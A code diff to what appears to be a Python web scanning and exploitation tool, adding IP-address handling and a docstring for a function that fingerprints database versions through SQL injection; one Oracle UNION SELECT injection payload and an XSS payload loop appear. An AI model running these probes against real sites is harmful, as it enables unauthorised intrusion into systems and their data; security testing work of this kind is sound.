@@ -68,6 +68,10 @@ def get_response(url, retries=3):
     print(f"[-] Failed to retrieve {url} after {retries} retries.")
     return None
 
+def is_ip_address(url):
+    ip_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
+    return ip_pattern.match(url) is not None
+
 def find_urls_to_test(url, base_url):
     """
     Attempts to discover URLs with GET parameters from the given page.
@@ -87,7 +91,12 @@ def find_urls_to_test(url, base_url):
         - Additionally searches through `<script>` content if no parameterized URLs are found.
         - Returns a set of URLs to test for vulnerabilities.
     """
+    if is_ip_address(url):
+        url = f"http://{url}"
     
+    if is_ip_address(base_url):
+        base_url = f"http://{base_url}"
+        
     response = get_response(url)
     if not response:
         return set()
@@ -166,6 +175,7 @@ def get_forms_and_inputs(response, max_attempts=3):
     return result
 
 def exploit_xss_url(url):
+    
     for payload in xss_payloads:
         target_url = f"{url}?input={payload}"
         try:
@@ -260,6 +270,28 @@ def submit_xss_payloads_to_forms(url):
     return False
 
 def exploit_database_version(url):
+    """
+    Attempts to detect the database type and version through SQL injection payloads.
+
+    Args:
+        url (str): The target URL where the SQL injection payloads will be tested.
+
+    Returns:
+        None: Prints the detected database type and version if found, or appropriate error messages.
+
+    Description:
+        - Defines a set of SQL injection payloads for various database types, including Oracle, MySQL, PostgreSQL, 
+          Microsoft SQL Server, SQLite, DB2, and Sybase.
+        - Iterates through each database type and its associated payloads.
+        - Sends a request with the SQL payload appended to the target URL.
+        - Analyzes the server's response to detect specific database-related keywords or error messages.
+        - If a potential database version is found, it parses the response and prints the database type and version.
+        - Handles HTTP status codes, specifically 403 (Forbidden) and 500 (Internal Server Error), and continues
+          testing payloads if no success is achieved with the initial payload.
+        - In case of an HTTP error or if no matching database type is detected after all payloads are exhausted, 
+          an appropriate message is printed.
+        - Includes exception handling for request-related errors to ensure the function doesn't crash on failure.
+    """
     database_types = {
         'Oracle': [
             "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
